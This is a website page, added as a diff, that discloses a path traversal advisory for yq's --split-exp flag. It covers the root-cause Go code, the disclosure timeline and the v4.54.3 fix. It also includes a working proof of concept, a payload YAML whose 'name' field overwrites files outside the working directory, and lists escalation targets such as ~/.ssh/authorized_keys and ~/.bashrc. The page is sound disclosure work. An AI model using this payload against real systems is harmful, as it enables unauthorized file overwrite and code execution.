@@ -1,0 +1,107 @@
+---
+layout: reporte
+title: "GHSA-9fvq-9qj8-6qhx — Arbitrary File Write via --split-exp Path Traversal in yq (mikefarah/yq)"
+description: "Path traversal in yq ≤4.54.1 via the --split-exp flag — document-controlled file names reach os.MkdirAll/os.Create unsanitized, allowing arbitrary file write outside the working directory. CVSS 7.3 HIGH. Fixed in v4.54.3."
+permalink: /reports/GHSA-9fvq-9qj8-6qhx/
+redirect_from: /reportes/GHSA-9fvq-9qj8-6qhx/
+permalink_es: /reportes/GHSA-9fvq-9qj8-6qhx-es/
+---
+
+<h1>Arbitrary File Write via <code>--split-exp</code> Path Traversal</h1>
+
+<div class="meta-badges">
+  <span class="badge badge-tipo">Path Traversal</span>
+  <span class="badge badge-sev-high">CVSS 7.3 HIGH</span>
+  <span class="badge badge-cwe">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</span>
+  <span class="badge badge-id">mikefarah/yq ≤ v4.54.1 (--split-exp)</span>
+</div>
+
+<p>
+  <a href="https://github.com/mikefarah/yq/security/advisories/GHSA-9fvq-9qj8-6qhx">GHSA-9fvq-9qj8-6qhx</a> · CVE assignment pending
+</p>
+
+<h2>Summary</h2>
+
+<p>The <code>--split-exp</code> (alias <code>-s</code>) flag evaluates a yq expression against input document content and uses the resulting scalar value <strong>directly as an output file path</strong> with no sanitization. Because neither <code>..</code> components nor absolute paths are rejected before the value reaches <code>os.MkdirAll</code> and <code>os.Create</code>, an attacker-controlled YAML/JSON/XML document can direct yq to create or overwrite arbitrary files anywhere the victim process has write permission. A victim who runs <code>yq -s '.name' attacker-payload.yml</code> against untrusted input may have files outside the current working directory silently overwritten — yq exits 0.</p>
+
+<h2>Impact</h2>
+
+<ul>
+  <li><strong>Arbitrary file write</strong> — create/overwrite files with attacker-controlled content (the processed document itself), plus arbitrary directory creation.</li>
+  <li><strong>Attack vector:</strong> network — untrusted YAML processed in CI/CD (charts, PR-supplied manifests, GitOps configs); no authentication required.</li>
+  <li><strong>Escalation:</strong> overwriting dotfiles, scripts, or workflow definitions (<code>~/.bashrc</code>, <code>~/.ssh/authorized_keys</code>, <code>.github/workflows/*.yml</code>, crontab) leads to code execution on the next run; any writable file can be truncated or corrupted.</li>
+</ul>
+
+<h2>Root Cause</h2>
+
+<p>In <code>pkg/yqlib/printer_writer.go</code>, <code>multiPrintWriter.GetWriter</code> takes the filename from the document itself and passes it to the filesystem unsanitized:</p>
+
+<pre><code class="language-go">// printer_writer.go:66-67 — name comes from the document
+if result.MatchingNodes.Len() &gt; 0 {
+    name = result.MatchingNodes.Front().Value.(*CandidateNode).Value
+}
+
+// printer_writer.go:69-72 — only an extension regex; no path validation
+var extensionRegexp = regexp.MustCompile(`\.[a-zA-Z0-9]+$`)
+if !extensionRegexp.MatchString(name) {
+    name = fmt.Sprintf("%v.%v", name, sp.extension)
+}
+
+// printer_writer.go:74-78 — unsanitized name reaches the sinks
+err = os.MkdirAll(filepath.Dir(name), 0750)
+...
+f, err := os.Create(name)
+</code></pre>
+
+<p>There is no <code>filepath.IsAbs</code> check, no rejection of <code>..</code> segments, and no base-directory confinement. <code>--split-exp-file</code> shares the same writer (only the expression source changes — <code>cmd/utils.go:57-64</code>); the flags are wired in <code>cmd/root.go:199-205</code>.</p>
+
+<h2>Proof of Concept</h2>
+
+<p>Tested against yq v4.54.1. A sentinel file outside the working directory is overwritten with the attacker document:</p>
+
+<pre><code class="language-bash"># Working directory /tmp/yq-poc/work; victim file outside it
+$ echo 'ORIGINAL SENSITIVE DATA - MUST NOT BE OVERWRITTEN' \
+    &gt; /tmp/yq-poc/victim/sensitive.yml
+
+# Attacker-controlled payload: 'name' contains the traversal path
+$ cat &gt; /tmp/yq-poc/work/payload.yml &lt;&lt;'EOF'
+name: ../victim/sensitive
+message: attacker-controlled write
+EOF
+
+$ cd /tmp/yq-poc/work
+$ yq -s '.name' payload.yml
+[exit 0 — silent; the flag derives file names from the document]
+
+$ cat /tmp/yq-poc/victim/sensitive.yml
+name: ../victim/sensitive
+message: attacker-controlled write          ← ORIGINAL DATA GONE
+</code></pre>
+
+<p>Confirmed variants: relative one level (<code>../victim/…</code>), relative two levels (escapes the PoC sandbox entirely), and absolute paths (<code>name: /tmp/arbitrary/target</code> creates or overwrites at the literal location). 3 screenshots attached to the advisory.</p>
+
+<h2>Disclosure Timeline</h2>
+
+<table>
+  <thead><tr><th>Date</th><th>Event</th></tr></thead>
+  <tbody>
+    <tr><td>2026-10-09</td><td>Vulnerability discovered; PoC confirmed (relative, two-level, and absolute-path variants)</td></tr>
+    <tr><td>2026-10-23</td><td>Reported via GitHub Private Vulnerability Reporting as Issue A of the combined advisory; accepted by the maintainer the same day</td></tr>
+    <tr><td>2026-11-05</td><td>Issue A split into the standalone advisory GHSA-9fvq-9qj8-6qhx</td></tr>
+    <tr><td>2026-11-09</td><td>Advisory published; fix released in yq v4.54.3</td></tr>
+    <tr><td>Pending</td><td>CVE assignment (request due now that a fix is public)</td></tr>
+  </tbody>
+</table>
+
+<h2>Fix</h2>
+
+<p>yq v4.54.3 restricts split output paths to the current directory by default:</p>
+
+<pre><code class="language-text">- Restricted `--split-exp` output paths to the current directory by default.
+  Use `--security-allow-write-any-path` with trusted input to restore the
+  previous behaviour (#2965)
+</code></pre>
+
+<p>The advisory also proposes a defensive <code>sanitizeSplitFilename</code> that rejects absolute paths and <code>..</code> segments after <code>filepath.Clean</code> before any <code>MkdirAll</code>/<code>Create</code> call. Workaround on vulnerable versions: do not pass untrusted documents to <code>--split-exp</code> / <code>--split-exp-file</code>.</p>
+
+<p><em>Fixed in yq v4.54.3 (2026-11-09). Advisory published 2026-11-09; CVE assignment pending.</em></p>
